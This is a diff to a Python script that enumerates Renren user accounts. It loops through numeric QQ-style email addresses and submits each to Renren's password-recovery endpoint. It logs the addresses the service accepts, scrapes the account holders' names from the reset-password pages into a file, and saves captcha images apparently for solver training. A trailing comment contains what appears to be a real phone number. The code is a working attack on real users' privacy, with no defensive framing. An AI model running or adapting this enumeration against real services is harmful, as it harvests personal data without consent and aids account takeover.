@@ -17,9 +17,9 @@ def get_resname(url):
     resname = re.search('title=".*?>', str(listofrsp))
     return resname.group()
 
-startnum = 1575550
+startnum = 1570272
 
-while startnum < 1580001:  #    1570272  1580001
+while startnum < 1570273:  #    1570272  15800001
     # 初始化
     s = requests.session()
     account = startnum
@@ -86,21 +86,21 @@ while startnum < 1580001:  #    1570272  1580001
     # 发送表单并处理结果
     response2 = s.post("https://safe.renren.com/standalone/findpwd/inputaccount", data=payload, headers=headers)
     result = re.search('"code".*?(\d)', response2.text)
-    s.close()
     if result.group() == '"code":0':  # 记录成功
         with open("1.txt", "a") as rwf:
             rwf.write(str(account) + "66@qq.com\n")
         r2cont = response2.content
         nurl1 = re.search('\?.*(",)', str(r2cont))
-        nurl2 = re.sub('["]', '', nurl1.group())
+        nurl2 = re.sub('["],', '', nurl1.group())
         nameurl = "http://safe.renren.com/standalone/findpwd/resetpwd" + nurl2
-        '''resname = get_resname(nameurl)
+        '''with open("url.txt", "a") as rwf:
+            rwf.write(nameurl+"\n"+str(account) + "66@qq.com\n")'''
+        resname=get_resname(nameurl)
         with open("name.txt", "a") as rwf:
-            rwf.write(str(account) + "66@qq.com" + resname + "\n")'''
-        print(nameurl+"\n"+"记录成功"+str(account) + "66@qq.com")
-        time.sleep(4)
-        with open("C:/data/project/renren/corrcap/" + captcha + "_" + str(account) + ".jpg", "wb") as wf:
-            wf.write(capimg.content)
+            rwf.write(resname + str(account) + "66@qq.com\n")
+        print("记录成功")
+        '''with open("C:/data/project/renren/corrcap/" + captcha + "_" + str(account) + ".jpg", "wb") as wf:
+            wf.write(capimg.content)'''
     elif result.group() == '"code":5':  # 验证码错误，账号不存在，账号封禁
         errresult = re.search('"error_text".*?("})', response2.text)
         if (errresult):
@@ -109,8 +109,8 @@ while startnum < 1580001:  #    1570272  1580001
                 startnum = startnum - 1
             else:
                 print("账号不存在")
-                with open("C:/data/project/renren/corrcap/" + captcha + "_" + str(account) + ".jpg", "wb") as wf:
-                    wf.write(capimg.content)
+                '''with open("C:/data/project/renren/corrcap/" + captcha + "_" + str(account) + ".jpg", "wb") as wf:
+                    wf.write(capimg.content)'''
         else:
             print(response2.text)
     else:  # 服务器繁忙，其他未知错误
@@ -118,6 +118,7 @@ while startnum < 1580001:  #    1570272  1580001
             serresult = re.search('服务.*?(再试)', response2.text)
             print(serresult.group())
             startnum = startnum - 1
+            time.sleep(5)
         except:
             print(response2.text)
 
@@ -127,7 +128,6 @@ while startnum < 1580001:  #    1570272  1580001
     with open("p.txt", "w") as rwf:
         rwf.write(str(account) + "66@qq.com")
 
-    time.sleep(1)
 
 '''payloadtest={"email":"18721347114",
              "icode":"",
